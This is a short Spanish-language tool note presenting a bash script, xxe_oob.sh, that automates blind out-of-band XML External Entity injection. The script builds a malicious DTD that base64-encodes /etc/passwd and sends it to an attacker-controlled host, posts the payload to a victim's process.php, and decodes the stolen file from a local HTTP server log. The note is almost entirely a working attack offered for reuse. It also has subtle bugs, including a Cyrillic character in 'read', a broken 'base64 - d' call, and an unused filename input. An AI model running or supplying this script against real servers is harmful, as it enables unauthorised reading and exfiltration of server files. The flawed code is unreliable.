# xxe\_oob.sh

***

* Tags: #herramientas #bash #hacking #scripting #XEE

***

**xxe\_oob.sh** es una herramienta en **bash** para automatizar el proceso de \[\[XXE (XML External Entity Injection)]] de manera a ciegas. Se basa en la el uso de un **DTD** y solicitudes al servicio web.

```bash
#!/bin/bash

echo -ne "\n[+] Introduce el archivo a leer: " && read -г myFilename

malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> 
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://<IP_ATACANTE>/?file=%file;'>\"> 
%eval; 
%exfil;"""

#Creamos el archivo DTD
echo $malicious_dtd > malicious.dtd

#Abrimos el servidor HTTP y guardamos el output en response
python3 -m http.server 80 &>response &
PID=$!

sleep 1; echo

curl -s -X POST "http://<IP_VÍCTIMA>/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<IP_ATACANTE>/malicious.dtd"> %xxe;]>
<root><name>test</name><tel>123456789</tel><email>test@test</email><password>test123</password></root>' &>/dev/null
#La tercera linea es la petición base hacia el servidor en raw

#Para quedarnos con la parte que nos interesa de la solicitud hacia el servidor (el archivo encodeado)
cat response | grep -oP "/?file=\K[^.*\s]+" | base64 - d

#Cerramos el servicio HTTP
kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null

```
